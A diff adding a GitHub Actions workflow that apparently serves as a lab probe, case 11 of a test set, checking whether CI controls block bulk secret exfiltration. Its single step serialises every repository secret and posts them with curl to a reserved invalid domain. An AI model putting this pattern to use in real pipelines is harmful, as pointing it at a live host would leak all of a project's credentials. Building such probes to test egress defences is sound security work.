@@ -1,0 +1,23 @@
+name: Hold probe 11 - bulk secrets egress
+
+on:
+  push:
+    branches:
+      - case-11-bulk-secrets-egress
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Attempt direct bulk-secret transfer to a reserved invalid domain
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+        run: |
+          curl --fail --max-time 3 \
+            --data-urlencode "secrets=${SECRETS_JSON}" \
+            https://bulk-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=bulk-secrets-egress'
